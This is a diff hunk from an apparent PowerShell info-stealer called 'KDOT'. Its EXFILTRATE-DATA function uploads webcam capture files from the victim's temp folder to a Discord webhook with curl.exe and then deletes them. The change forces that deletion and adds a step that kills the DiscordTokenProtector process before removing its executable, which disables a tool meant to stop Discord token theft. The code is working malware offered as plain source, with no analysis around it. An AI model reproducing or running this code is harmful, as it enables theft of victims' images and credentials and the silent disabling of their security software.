@@ -428,13 +428,14 @@ function EXFILTRATE-DATA {
     foreach ($item in $items) {
         $name = $item.Name
         curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:localappdata\temp\$name\`"" $webhook | out-null
-        Remove-Item $item
+        Remove-Item $item -Force
     }
 
     Set-Location $env:LOCALAPPDATA\Temp
 
     $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
     if ($token_prot -eq $true) {
+        Stop-Process -Name DiscordTokenProtector -Force
         Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
     }
 
